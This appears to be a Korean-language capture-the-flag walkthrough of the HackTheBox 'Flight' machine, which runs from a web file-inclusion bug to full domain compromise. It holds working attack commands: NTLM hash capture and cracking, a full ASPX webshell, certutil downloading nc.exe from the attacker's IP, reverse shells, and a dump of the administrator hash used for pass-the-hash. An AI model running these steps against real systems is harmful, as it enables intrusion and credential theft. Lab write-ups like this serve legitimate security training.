# Flight - HackTheBox
## Recon
```bash
sudo nmap -p 135,139,3268,3269,389,445,464,49667,49677,49678,49690,49700,53,593,636,80,88,9389 -sC -sV -vv -oA flight 10.129.228.120
```
<img width="1204" height="426" alt="image" src="https://github.com/user-attachments/assets/e6e9cf77-1a88-404d-9896-22021a5dab2c" />
<img width="1204" height="185" alt="image" src="https://github.com/user-attachments/assets/07087d22-a607-4c6d-883b-c7d5ad8951e5" />

- HTTP(80)
- KERBEROS(88)
- LDAP(389)
- SMB(445)

<br>

- `/etc/hosts`에 `flight.htb` 추가.
<img width="1204" height="70" alt="image" src="https://github.com/user-attachments/assets/2101fe2c-560c-423b-b008-7b3a52263a84" />

---
## HTTP
### banner grabbing
<img width="1204" height="336" alt="image" src="https://github.com/user-attachments/assets/b1659e89-5080-4fb0-a86e-74fec0d42368" />

### VHOST
- `school.flight.htb` 발견.
```bash
ffuf -w ~/util/subdomains.txt -u http://flight.htb -H 'Host:FUZZ.flight.htb' -mc all -fs 7069
```
<img width="1204" height="52" alt="image" src="https://github.com/user-attachments/assets/dda6d4f9-270c-4101-89c8-37535f6b2db1" />

### RFI
- 메인페이지에서는 특별한 정보 찾을 수 없었음.
- `school.flight.htb`에서 다른 페이지들의 경로를 확인해보니 `view` 파라미터를 통해서 보여지고 있는 것으로 확인.
<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/6b76cdc8-f976-43f0-a683-44904c748d1a" />

<br>
<br>

- `LFI` 테스트 시도하여 성공.
<img width="570" height="253" alt="image" src="https://github.com/user-attachments/assets/af7169c6-0c1c-453d-910b-f0b5e0f67732" />

<br>
<br>

- `RFI`테스트 시도하여 성공.
<img width="614" height="254" alt="image" src="https://github.com/user-attachments/assets/dd04f69c-8f76-4f67-9d7f-12f883a0b9f0" />

<br>
<br>

- web shell로 명령어 실행이 되는지 시도해 보았으나 실패.
<img width="838" height="254" alt="image" src="https://github.com/user-attachments/assets/fa0ae249-1670-420d-914a-aeff3a9f7203" />

<br>
<br>

- `responder`를 사용하여 해시 캡쳐.
<img width="1203" height="208" alt="image" src="https://github.com/user-attachments/assets/f02e0102-0fee-4926-bff9-562aa0fc1b1c" />

<br>
<br>

- 크래킹.
```bash
john hash --wordlist=~/util/rockyou.txt
```
<img width="1203" height="222" alt="image" src="https://github.com/user-attachments/assets/8f2e0642-a622-486e-af25-680ead52c2ab" />

<br>
<br>

- `svc_apache:S@Ss!K@*t13` 로그인 성공.
```bash
nxc smb 10.129.228.120 -u svc_apache -p 'S@Ss!K@*t13'
```
<img width="1203" height="118" alt="image" src="https://github.com/user-attachments/assets/5e5dfd64-2d0c-436b-b675-fa0851d787fe" />

---
## Auth as s.moon
- 유저목록 수집.
```bash
nxc smb 10.129.228.120 -u svc_apache -p 'S@Ss!K@*t13' --users
```
<img width="1203" height="466" alt="image" src="https://github.com/user-attachments/assets/aa6c6449-28ed-4da5-8152-05db0d341a7a" />

<br>
<br>

- SMB에서 특별한 정보를 찾을 수 없었음.
- 획득한 비밀번호를 다른 계정에 로그인 테스트하여 `s.moon` 로그인 성공.
```bash
nxc smb 10.129.228.120 -u users -p 'S@Ss!K@*t13' --continue-on-success
```
<img width="1203" height="400" alt="image" src="https://github.com/user-attachments/assets/0705efa1-15a0-4da2-b59f-c74198fa8bf4" />

## Auth as c.bum
- `/Shared`경로로 쓰기 권한 발견.
<img width="1203" height="364" alt="image" src="https://github.com/user-attachments/assets/de4f4f3c-9a89-4b0f-9437-fb45a7f6f39b" />

<br>
<br>

- 내부에는 아무것도 존재하지 않음.
```bash
smbclient -U s.moon //10.129.228.120/Shared
```
<img width="1203" height="202" alt="image" src="https://github.com/user-attachments/assets/2cd47dba-e456-4c4a-b3a7-c49bc0dfcec0" />

<br>
<br>

- https://github.com/Greenwolf/ntlm_theft
- 쓰기권한이 있어 악성 파일을 업로드하면 해시를 획득할 수 있을 것이라 가정.
- `ntlm_theft`를 사용하여 악성 파일 생성.
```bash
python3 ntlm_theft.py -g all -s 10.10.14.22 -f test
```
<img width="1203" height="245" alt="image" src="https://github.com/user-attachments/assets/87264ebf-39c5-43bb-8da9-9930f5019495" />

<br>
<br>

- `responder`를 실행시킨 상태에서 악성파일 모두 업로드 시도.
- 모든 파일이 전부 업로드 되는 것은 아닌 상태.
<img width="1203" height="266" alt="image" src="https://github.com/user-attachments/assets/47e28809-9ee3-4a45-9135-296208d93349" />

<br>
<br>

- 해시 획득.
```bash
sudo responder -I tun0 -v
```
<img width="1203" height="200" alt="image" src="https://github.com/user-attachments/assets/f817a06f-9bc9-4008-aec0-0e3299a8169e" />

<br>
<br>

- 크래킹.
```bash
john hash --wordlist=~/util/rockyou.txt
```
<img width="1203" height="230" alt="image" src="https://github.com/user-attachments/assets/6c87133b-08ea-43bf-9f57-f91253ca249e" />

<br>
<br>

- `c.bum:Tikkycoll_431012284`로그인 성공.
<img width="1203" height="120" alt="image" src="https://github.com/user-attachments/assets/27c79dd5-5854-41ce-afbf-390074f3e982" />

---
## Shell as svc_apache
- `/Web`경로로 쓰기 권한 발견.
```bash
nxc smb 10.129.228.120 -u c.bum -p 'Tikkycoll_431012284' --shares
```
<img width="1203" height="360" alt="image" src="https://github.com/user-attachments/assets/205be5fc-2533-4706-b619-e7263189464b" />

<br>
<br>

- `/school.flight.htb`경로에 웹셸 업로드.
```bash
smbclient -U c.bum //10.129.228.120/web
```
<img width="1203" height="47" alt="image" src="https://github.com/user-attachments/assets/5ed14b38-eedb-4de5-9a03-ebb35d4df404" />

<br>
<br>

- 명령어 실행 성공.
```bash
curl 'http://school.flight.htb/ex.php/?cmd=whoami'
```
<img width="1203" height="139" alt="image" src="https://github.com/user-attachments/assets/d3dc49b5-4943-46d0-83b3-1a3effb7376a" />

<br>
<br>

- `nc.exe`를 로컬로부터 다운로드 받아서 리버스 셸 실행.
```bash
curl 'http://school.flight.htb/ex.php/?cmd=certutil%20-urlcache%20-f%20-split%20http%3A%2F%2F10.10.14.22%2Fnc.exe%20C%3A%5Cwindows%5Ctemp%5Cnc.exe'

curl 'http://school.flight.htb/ex.php/?cmd=c%3A%5Cwindows%5Ctemp%5Cnc.exe%2010.10.14.22%20443%20-e%20cmd.exe'
```
<img width="1203" height="222" alt="image" src="https://github.com/user-attachments/assets/a72d0123-29c1-4d80-9123-95bdd38cfb8f" />
<img width="1203" height="50" alt="image" src="https://github.com/user-attachments/assets/dec7d4f4-a632-4a3d-b207-7c262579bb47" />

<br>
<br>

- 셸 획득.
<img width="1203" height="227" alt="image" src="https://github.com/user-attachments/assets/79195764-0a13-4c36-91ad-0fcecbd89753" />

---
## Shell as c.bum
- 내부에서 특별한 정보를 찾지 못함.
- `c.bum`의 계정을 알고 있어 `RunasCs.exe`와 `nc.exe`를 로컬로부터 다운로드 받아서 셸 생성.
```powershell
.\runascs.exe c.bum "Tikkycoll_431012284" "c:\temp\nc.exe 10.10.14.22 80 -e cmd.exe"
```
<img width="1203" height="93" alt="image" src="https://github.com/user-attachments/assets/acb60e26-3568-43b2-aca8-e2c78a05ebe1" />

<br>
<br>

- 셸 획득.
<img width="1203" height="225" alt="image" src="https://github.com/user-attachments/assets/4a6fd93e-1ee2-4255-b652-caf5b5d54b86" />

---
## Shell as defaultapppool
- 웹서버가 실행되고 있음에도 `inetpub`이라는 경로 발견.
<img width="1203" height="421" alt="image" src="https://github.com/user-attachments/assets/f047773d-e382-40d4-9aa0-b63ffaa07829" />

<br>
<br>

- `c:\inetpub\development`경로에서 다른 서버가 실행되고 있다 생각하여 포트 확인.
- 8000번 포트가 열려있음.
<img width="1203" height="383" alt="image" src="https://github.com/user-attachments/assets/3c5ab94d-2f5c-429b-bf1d-437fa5e7cef7" />
<img width="1203" height="420" alt="image" src="https://github.com/user-attachments/assets/0430f159-8f65-44ec-ab59-83e5ea7f91c5" />

<br>
<br>

- 포트포워딩을 생성.
```
./chisel server -p 8888 -reverse

.\chisel.exe client 10.10.14.22:8888 R:8000:127.0.0.1:8000
```
<img width="1203" height="102" alt="image" src="https://github.com/user-attachments/assets/4cca6b53-685c-4029-9dbb-9e398e0c11ad" />
<img width="1203" height="136" alt="image" src="https://github.com/user-attachments/assets/845ce163-d5ab-48e5-8c29-af6b5a343efc" />

<br>
<br>

- 로컬에서 접속.
<img width="1323" height="654" alt="image" src="https://github.com/user-attachments/assets/86d21949-6751-4fd3-a260-a9aa512db0e9" />

<br>
<br>

- `IIS`를 사용중.
- `apsx`파일을 생성할 수 있으면 셸을 얻을 수 있을 것이라 가정.
<img width="1205" height="329" alt="image" src="https://github.com/user-attachments/assets/474fe922-2a2b-459d-8e8a-cdd44888cd34" />

<br>
<br>

- 파일 생성 가능.
<img width="1205" height="468" alt="image" src="https://github.com/user-attachments/assets/3bf679d6-2c64-4497-9062-f71b7968a7c7" />

<br>
<br>

- 웹 셸을 로컬로부터 다운로드.
```aspx
<%@ Page Language="C#" Debug="true" Trace="false" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<script Language="c#" runat="server">
void Page_Load(object sender, EventArgs e)
{
}
string ExcuteCmd(string arg)
{
ProcessStartInfo psi = new ProcessStartInfo();
psi.FileName = "cmd.exe";
psi.Arguments = "/c "+arg;
psi.RedirectStandardOutput = true;
psi.UseShellExecute = false;
Process p = Process.Start(psi);
StreamReader stmrdr = p.StandardOutput;
string s = stmrdr.ReadToEnd();
stmrdr.Close();
return s;
}
void cmdExe_Click(object sender, System.EventArgs e)
{
Response.Write("<pre>");
Response.Write(Server.HtmlEncode(ExcuteCmd(txtArg.Text)));
Response.Write("</pre>");
}
</script>
<HTML>
<HEAD>
<title>awen asp.net webshell</title>
</HEAD>
<body >
<form id="cmd" method="post" runat="server">
<asp:TextBox id="txtArg" style="Z-INDEX: 101; LEFT: 405px; POSITION: absolute; TOP: 20px" runat="server" Width="250px"></asp:TextBox>
<asp:Button id="testing" style="Z-INDEX: 102; LEFT: 675px; POSITION: absolute; TOP: 18px" runat="server" Text="excute" OnClick="cmdExe_Click"></asp:Button>
<asp:Label id="lblText" style="Z-INDEX: 103; LEFT: 310px; POSITION: absolute; TOP: 22px" runat="server">Command:</asp:Label>
</form>
</body>
</HTML>

<!-- Contributed by Dominic Chell (http://digitalapocalypse.blogspot.com/) -->
<!--    http://michaeldaw.org   04/2007    -->
```
<img width="1205" height="134" alt="image" src="https://github.com/user-attachments/assets/164dd9a2-51f5-4515-884a-3d44b8bca0dd" />

<br>
<br>

- 명령어 실행 가능.
<img width="897" height="70" alt="image" src="https://github.com/user-attachments/assets/bfc154b4-1c8e-47c3-9e9d-2010e03dd6de" />

<br>
<br>

- 리버스 셸 명령어 실행.
```
c:\temp\nc.exe 10.10.14.22 443 -e cmd.exe
```
<img width="897" height="70" alt="image" src="https://github.com/user-attachments/assets/cde359c8-b5b5-4f1b-b2f7-2e5c709c8afb" />

<br>
<br>

- 셸 획득.
<img width="1202" height="225" alt="image" src="https://github.com/user-attachments/assets/d9942958-ab86-4b0a-950b-a9d5f8896fb5" />

---
## Privesc
- `iis apppool\defaultapppool`은 윈도우의 가상 계정.
- 네트워크를 통해서 접속할 경우 머신 계정으로 접속이 됨.
```bash
sudo responder -I tun0 -v
```
<img width="1202" height="180" alt="image" src="https://github.com/user-attachments/assets/a02bdcce-a90b-4a70-8726-0579c374b269" />

<br>
<br>

- 로컬로부터 `Rubeus.exe`를 다운로드 받아서 티켓 발행.
```powershell
.\rubeus.exe tgtdeleg /nowrap
```
<img width="1202" height="398" alt="image" src="https://github.com/user-attachments/assets/a1aba255-800e-4a81-87df-95567da2deee" />

<br>
<br>

- 티켓 변환.
```bash
impacket-ticketConverter ticket.kirbi ticket.ccache
```
<img width="1202" height="206" alt="image" src="https://github.com/user-attachments/assets/1c97533d-3576-40b3-8eba-13727a7ef584" />

<br>
<br>

- 티켓을 사용하여 해시 탈취.
```bash
export KRB5CCNAME=ticket.ccache

impacket-secretsdump -k -no-pass g0.flight.htb -just-dc-user administrator
```
<img width="1202" height="337" alt="image" src="https://github.com/user-attachments/assets/92554e29-864c-4736-b063-f8b5750815aa" />

<br>
<br>

- 로그인 성공.
```bash
nxc smb 10.129.3.158 -u administrator -H 43bbfc530bab76141b12c8446e30c17c
```
<img width="1205" height="148" alt="image" src="https://github.com/user-attachments/assets/ecb79128-f46d-41d6-a06e-9f84d39c204c" />

<br>
<br>

- 셸 획득.
```bash
impacket-psexec -hashes :43bbfc530bab76141b12c8446e30c17c administrator@10.129.3.158
```
<img width="1205" height="360" alt="image" src="https://github.com/user-attachments/assets/187d14a5-d1a8-42fc-ad54-a37d854521a8" />

---
## FLAG
- `c:\users\c.bum\desktop\user.txt`
<img width="1205" height="248" alt="image" src="https://github.com/user-attachments/assets/098591f6-c623-4f53-8f86-568ced4923cd" />

<br>
<br>

- `c:\users\administrator\desktop\root.txt`
<img width="1205" height="248" alt="image" src="https://github.com/user-attachments/assets/8133daec-b1da-4fb7-a3a0-c80da0e18578" />
